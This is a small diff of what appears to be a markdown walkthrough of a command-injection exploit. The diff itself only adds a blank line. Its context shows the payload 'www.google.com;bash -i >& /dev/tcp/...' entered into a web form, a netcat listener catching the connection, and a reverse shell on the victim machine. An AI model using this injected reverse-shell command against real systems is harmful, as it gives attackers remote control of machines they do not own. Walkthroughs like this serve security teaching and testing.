@@ -104,6 +104,7 @@ www.google.com;bash -i >& /dev/tcp/192.168.8.104/4444 0>&1
 Once we click submit our netcat listener should revice a connection.
 
   ![alt text](/screens/netcat_listener.png)
+  
  Great, we have a reverse shell on victim machine.
  
  ## Using the exploit
